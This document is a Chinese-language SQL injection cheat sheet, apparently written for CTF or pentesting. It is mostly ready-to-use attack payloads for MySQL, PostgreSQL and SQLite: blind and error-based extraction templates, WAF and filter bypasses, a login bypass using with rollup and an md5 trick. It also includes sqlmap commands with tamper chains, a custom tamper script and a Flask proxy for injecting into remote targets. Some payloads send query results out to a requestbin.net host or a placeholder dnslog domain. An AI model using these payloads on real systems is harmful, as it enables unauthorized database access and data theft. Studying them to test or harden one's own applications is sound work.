# SQli

- 常规方法利用``information_schema``

```sql
#爆库
select database()
#爆表
select group_concat(table_name) from information_schema.tables where table_schema=<database name>
#爆字段
select group_concat(column_name) from information_schema.columns where table_name=<table name>
#爆数据
select group_concat(<column name>) from <table name>
```

- mysql &gt; 5.6 版本 利用sys库

```sql
# 爆表
# schema_auto_increment_columns

select group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+

# schema_table_statistics_with_buffer

select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+
```

- mysql &gt; 5.5 利用`innodb_table_stats`

```sql
# 爆表
select group_concat(table_name) from mysql.innodb_table_stats
```

## 注入方式

### 报错注入

  * `updatexml(1,concat(1,(<SQLi>)),1)`
  * `extractvalue(1,concat(1,<SQli>))`

### 联合注入

```sql
union select
```
### 堆叠注入

  * 利用show
    ```sql
    show databases;
    show tables;
    ```

  * 利用set prepare

    ```sql
    set @t=(<sqli>);prepare x from @t;execute x;#
    ```

  * 利用handler(MySQL)
    语法结构
    ```sql
    HANDLER tbl_name OPEN [ [AS] alias]

    HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
        [ WHERE where_condition ] [LIMIT ... ]
    HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
        [ WHERE where_condition ] [LIMIT ... ]
    HANDLER tbl_name READ { FIRST | NEXT }
        [ WHERE where_condition ] [LIMIT ... ]

    HANDLER tbl_name CLOSE
    ```
    Example:
    ```sql
    handler <tablename> open as <handlername>; #指定数据表进行载入并将返回句柄重命名
    handler <handlername> read first; #读取指定表/句柄的首行数据
    handler <handlername> read next; #读取指定表/句柄的下一行数据
    ...
    handler <handlername> close; #关闭句柄
    ```
### 盲注

#### 时间盲注

  * 时间盲注

    和布尔盲注类似，不过因为没有回显，采用网页响应时间来判定数据
    
    利用``SLEEP(n)``
    
    绕过

    ```sql
    benchmark(1000000,sha(1))
    pow(99,99)
    SELECT count(*) FROM information_schema.tables A,information_schema.columns B,information_schema.tables C
    ```

```python
#payload="if((ascii(substr(({0}),{1},1)))>{2},sleep(3),0)--+".format(sql,i,mid)
#payload="and case when (ascii(substr({},{},1))>{}) then (benchmark(1000000,sha(1))) else 2 end".format(sql,i,mid)
#payload="if((ascii(substr(({0}),{1},1)))>{2},sleep(3),0)".format(sql,i,mid)
```

参考资料：https://www.anquanke.com/post/id/170626
#### 布尔盲注

  * 利用`if() ,like,or,>,=,<`

  * ``>`` 可以用 ``greatest`` + ``=`` 绕过

```python
#payload="0^((ascii(substr(({0}),{1},1)))>{2})^0#".format(sql,i,mid)
#payload="0^((ascii(mid(({0}),{1},1)))>{2})^0#".format(sql,i,mid)
#payload="if((ascii(substr(({0}),{1},1)))>{2},1,0)".format(sql,i,mid)
#payload="union select * from images where id=if((ascii(substr(({0}),{1},1)))>{2},1,0)#".format(sql,i,mid)
```
#### 带外盲注
  
* dblink postgresql

  ```python
  #poc = """a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=p password=1 dbname=ans{' || (%s) || '}d')) --""" % (sql)
  #poc = """a' UNION SELECT 1,(SELECT dblink_connect('host=z' || (%s) || 'z.bb958293c85e2e52148a.d.requestbin.net user=p password=1 dbname=ans')) --""" % (sql)
  ```
*  load_file mysql 
  
  ```sql
  select load_file(concat('\\\\', (<sqli>), '.your-dnslog.com'));
  ```

## 绕过方式

* 加`()、/**/` bypass`空格`


* 无列名注入  
  考虑这样的表格，使用select 1,2,3,4,5 union select * from persons可以得到一张新的表格

  ```
  MariaDB [test]> select * from persons;
  +------+----------+-----------+--------------+--------+
  | ID   | LastName | FirstName | Address      | Credit |
  +------+----------+-----------+--------------+--------+
  |    1 | Gates    | Bill      | Xuanwumen 10 |   NULL |
  |    1 | Gates    | Bill      | Xuanwumen 10 |   NULL |
  |    2 | Xill     | Hiler     | Like 10      | 100.67 |
  |    2 | Eki      | Hiler     | Nanfen 10    | 100.67 |
  +------+----------+-----------+--------------+--------+

  ->

  MariaDB [test]> select 1,2,3,4,5 union select * from persons;
  +------+-------+-------+--------------+--------+
  | 1    | 2     | 3     | 4            | 5      |
  +------+-------+-------+--------------+--------+
  |    1 | 2     | 3     | 4            |      5 |
  |    1 | Gates | Bill  | Xuanwumen 10 |   NULL |
  |    2 | Xill  | Hiler | Like 10      | 100.67 |
  |    2 | Eki   | Hiler | Nanfen 10    | 100.67 |
  +------+-------+-------+--------------+--------+
  ```

  然后就可以套娃拿数据了,注意`a`这个别名\(任意内容\)是必须的（新生成的表）

      MariaDB [test]> select `2` from (select 1,2,3,4,5 union select * from persons)a;          
      +-------+
      | 2     |
      +-------+
      | 2     |
      | Gates |
      | Xill  |
      | Eki   |
      +-------+

  或者也可以将数字换成别名 在反引号不可用的情况下

  ```
  MariaDB [test]> select b from (select 1,2 as b,3,4,5 union select * from persons)a;
  +-------+
  | b     |
  +-------+
  | 2     |
  | Gates |
  | Xill  |
  | Eki   |
  +-------+
  ```

* `like` bypass `=`

  >"%" 可用于定义通配符（模式中缺少的字母）
  >
  >从 "Persons" 表中选取居住在以 "g" 结尾的城市里的人
  >
  >```sql
  >SELECT * FROM Persons
  >WHERE City LIKE '%g'
  >```

* 利用双hex(保证纯数字字符)注入
  ``'%2B(select hex(hex(database())))%2B'0``

* GBK编码下 ``addslash()`` 绕过 宽字节绕过

  ``%df%27``

  原理就是 addslash后变成``%df%5c%27``了

* 看回显点

  ```sql
  select 1,2,3,....
  ```

* 注释符

  * ``/**/``
  * ``\# -> %23``

  * ``-- `` 

* ``order by``看字段数 先看看有几个回显点也可以用``group by``

  ```sql
  1' order by 3#
  ->

  1' order by 4#
  ->
  Error
  ```

* ``limit``

  ```sql
  limit i,n
  # tableName：表名
  # i：为查询结果的索引值(默认从0开始)，当i=0时可省略i
  # n：为查询结果返回的数量
  # i与n之间使用英文逗号","隔开
  ```

  * 修改 ``||``(或)运算符为字符串连接符
    ``set sql_mode=PIPES_AS_CONCAT;`` 
  
  * substr被过滤
    
    ```sql
    left(str,index) //从左边第index开始读取
    right(str,index) //从右边index开始读取
    mid(str,index,len)//从index开始截取str,截取len的长度
    substring(strd,index) //从左边index开始读取
    lpad(str, padded_length, [ pad_str ] )//在str左填充给定的pad_str到指定的长度len,返回len个字符
    rpad(str, padded_length, [ pad_str ] )//在str右填充给定的pad_str到指定的长度len,返回len个字符
    ```
  * ascii被过滤

    ``hex() ord() bin()``
  
  * load_file dnslog注入
    
    poc:
    ```
    select load_file(concat('\\\\', (<sqli>), '.your-dnslog.com'));
    ```
  * 逗号绕过 
    
    对于``substr()``和``mid()``这两个方法可以使用``from to``的方式来替代逗号分隔的参数

    ``limit`` 用``offset``绕过
    
    使用join：
    
    ```sql
    union select 1,2     #等价于
    union select * from (select 1)a join (select 2)b
    ```
    
    使用like：
    
    ```sql
    select user() like 'r%'  -- 匹配r开头
    ```

    无列名盲注绕过：
    
    ```
    select c from (select * from (select 1 `a`)m join (select 3 `b`)n join (select 4 `c`)p join (select 5 `d`)q  join (select 6 `e`)r where 0 union select * from minil_users1 )x limit 1 offset 2
    ```
  * 空格绕过
    
    mysql查询的时候将会忽略字符串尾部的空格
  
  * 格式化字符串逃逸 ``%``
    https://zhuanlan.zhihu.com/p/115777073 

  * order by 盲注
    
    1. 利用不同的order by 返回的结果盲注 类似 bool盲注

    https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/

    1. 利用 order by的特性进行盲注

      ```
      MariaDB [test]> select * from users union select 1,2,3 order by 3;
      +----+----------+----------+
      | Id | username | password |
      +----+----------+----------+
      |  1 | 2        | 3        |
      |  1 | admin    | admin    |
      |  2 | eki      | test123  |
      +----+----------+----------+
      3 rows in set (0.001 sec)

      MariaDB [test]> select * from users union select 1,2,'~' order by 3;
      +----+----------+----------+
      | Id | username | password |
      +----+----------+----------+
      |  1 | admin    | admin    |
      |  2 | eki      | test123  |
      |  1 | 2        | ~        |
      +----+----------+----------+
      ```
    *  select * from users2 where 1 group by password with rollup having password is NULL;
    
    1. 利用 with rollup 的特性构造字段 NULL 绕过验证
       ```
        MariaDB [test]> select * from users2 where 1 group by 1 with rollup;
        +----+----------+----------+-------+
        | Id | username | password | token |
        +----+----------+----------+-------+
        |  1 | eki      | test123  | 233   |
        |  2 | admin    | admin    | 233   |
        | NULL | admin    | admin    | 233   |
        +----+----------+----------+-------+
        MariaDB [test]> select * from users2 where 1 group by 2 with rollup;
        +----+----------+----------+-------+
        | Id | username | password | token |
        +----+----------+----------+-------+
        |  2 | admin    | admin    | 233   |
        |  1 | eki      | test123  | 233   |
        |  1 | NULL     | test123  | 233   |
        +----+----------+----------+-------+
        MariaDB [test]> select * from users2 where 1 group by password with rollup having password is NULL;
        +----+----------+----------+-------+
        | Id | username | password | token |
        +----+----------+----------+-------+
        |  1 | eki      | NULL     | 233   |
        +----+----------+----------+-------+
      ```
    * group by + with rollup 绕过二次密码检验
      分组rollup后参数为NULL 

## 关于Mysql

### 空白字符绕过

在php中\s会匹配0x09,0x0a,0x0b,0x0c,0x0d,0x20

但是在mysql中空白字符为  0x09,0x0a,0x0b,0x0c,0x0d,0x20,0xa0 

可以实现空白字符绕过

### EXP报错溢出

```
mysql> select exp(709);
+-----------------------+
| exp(709)              |
+-----------------------+
| 8.218407461554972e307 |
+-----------------------+
1 row in set (0.00 sec) 

mysql> select exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
```


## 关于Sqlite

sqlite每个db文件就是一个数据库，不存在``information_schema``数据库，但存在类似作用的表``sqlite_master``。

该表记录了该库下的所有表，索引，表的创建sql

```sql
select group_concat(name) from sqlite_master where type='table'  #读取表名
select group_concat(sql) from sqlite_master where type='table' and name='<table name>' #读取字段
```

``OR EXISTS({0} LIKE \"{1}%\" limit 1).format(sql,tmp)`` #匹配以{1}开头的数据

在sqlite3 中，abs 函数有一个整数溢出的报错，如果 abs 的参数是 ``-9223372036854775808 (0x8000000000000000)`` 就会报错，同样如果是正数也会报错

与mysql不同 sqlite中十六进制会被转换为十进制

所以sqlite中字符串无法使用十六进制绕过

但是仍可以使用函数绕过，但因不存在mysql中ord,ascii等，sqlite中应该使用char与hex

```sql
select * from sqlite_master where type=char(0x74,0x61,0x62,0x6c,0x65);
select * from sqlite_master where type='table';
```

bypass if

```sql
select case (1) when 1 then 2 else 0
select ifnull(nullif(1,2),3) 
```

>ifnull(X,Y)
>
>The ifnull() function returns a copy of its first non-NULL argument, or NULL if both arguments are NULL. Ifnull() must have exactly 2 arguments. The ifnull() function is equivalent to coalesce() with two arguments.
>
>nullif(X,Y)
>
>The nullif(X,Y) function returns its first argument if the arguments are different and NULL if the arguments are the same. The nullif(X,Y) function searches its arguments from left to right for an argument that defines a collating function and uses that collating function for all string comparisons. If neither argument to nullif() defines a collating function then the BINARY is used.


### 利用 " ' ` [] 可以包裹列名的特性绕过

```sql
select Name from User
->
Name
Eki
John
Alice

select [Name][123] from User
->
123
Eki
John
Alice
```

**Example**

```sql
CREATE TABLE $table_name (dummy1 TEXT, dummy2 TEXT, `$column` $type);

table_name=[abc]as select [sql][&columns[0][name]=]from sqlite_master;&columns[0][type]=1
->
$sql = "CREATE TABLE [abc] as select [sql][ (dummy1 TEXT, dummy2 TEXT, `]from sqlite_master;` 1);";
->
create table [abc] as select sql from sqlite_master
```

### md5 绕过


``ffifdyop``

经过md5加密后：276f722736c95d99e921722cf9ed621c

再转换为字符串：``'or'6<乱码>``  即  ``'or'66�]��!r,��b``

类似的还有``12958192621165157191246674165187868492``


## SQLMAP

基本流程

POST存个post报文``test``然后``-p``注入的参数

```
sqlmap -r test.txt -p id
```

直接用url GET这样写

```
sqlmap -u http://xxx.xxx/?id=1 -p id
```

``--batch``使用默认设置

一些常用的命令

```
sqlmap -u url --dbs //爆数据库
sqlmap -u url --current-db //爆当前库
sqlmap -u url --current-user //爆当前用户
sqlmap -u url --users查看用户权限
sqlmap -u url --tables -D数据库 //爆表段
sqlmap -u url --columns -T表段 -D 数据库 //爆字段
sqlmap -u url --dump -C字段 -T 表段 -D 数据库 //猜解
sqlmap -u url --dump --start=1 --stop=3 -C字段 -T 表段 -D 数据库 //猜解1到3的字段
```

常用的一些tamper

``space2comment,randomcase``

写一个简单的temper

```python
# sqlmap/tamper/backquotes.py
 
from lib.core.enums import PRIORITY
 
__priority__ = PRIORITY.LOWEST
 
def dependencies():
    pass
 
def tamper(payload, **kwargs):
    return "1`,"+payload+")#"
```

### 代理注入

example:

```python
from flask import Flask,request
import requests

purl = "http://xxx"

app = Flask(__name__)

@app.route('/')
def index():
    status=request.args.get('a')

    headers = {
        'Host': 'xxx.xxx',
        'Connection': 'close',
        'Status': status,
        'DNT': '1',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"',
        'Accept': '*/*',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'http://xxx/',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    res = requests.get('https://xxx/server.php', headers=headers, verify=False)    
    return res.text

if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=True,port=8000)
```

这样就可以sqlmap本地服务来对远程服务进行注入，方便指定真实注入点和控制参数

### 利用SQLMAP FUZZ

无脑叠tamper就行

普通tamper搭配方式:
```
tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
数据库为MSSQL的搭配方式:
```
tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
数据库为MySql的搭配方式:
```
tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversi
```
## JDBC 注入

```
jdbc:mysql://localhost:3306/数据库名?user=用户名&password=密码&useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT
```


## 参考资料

对MYSQL注入相关内容及部分Trick的归类小结

[https://xz.aliyun.com/t/7169](https://xz.aliyun.com/t/7169)

sqlite 全函数查询

https://www.sqlite.org/lang_corefunc.html

sqlmap tamper的使用

https://www.cnblogs.com/r00tuser/p/7252796.html